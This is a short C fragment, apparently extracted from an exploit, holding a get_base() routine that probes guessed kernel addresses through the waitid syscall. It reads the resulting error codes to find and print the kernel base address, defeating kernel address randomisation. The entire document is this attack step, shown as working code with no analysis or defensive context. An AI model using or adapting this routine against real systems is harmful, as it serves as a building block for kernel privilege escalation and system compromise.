
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int P_ALL ;
 int SYS_waitid ;
 int WEXITED ;
 int errno ;
 unsigned long kernel_base ;
 int printf (char*,...) ;
 scalar_t__ start_rw_off ;
 int syscall (int ,int ,int ,scalar_t__,int ,int *) ;

unsigned long get_base() {


  unsigned long start = 0xffffffff00000000;
  unsigned long inc = 0x0000000000100000;
  unsigned long guess = start;
  while (guess != 0) {
    int res = syscall(SYS_waitid, P_ALL, 0, guess+start_rw_off, WEXITED, ((void*)0));
    if (errno != 14) {
      printf("found kernel base 0x%lx\n", guess);
      kernel_base = guess;
      return guess;
    }

    guess += inc;
  }
  printf("failed to find base address...");
  return -1;
}
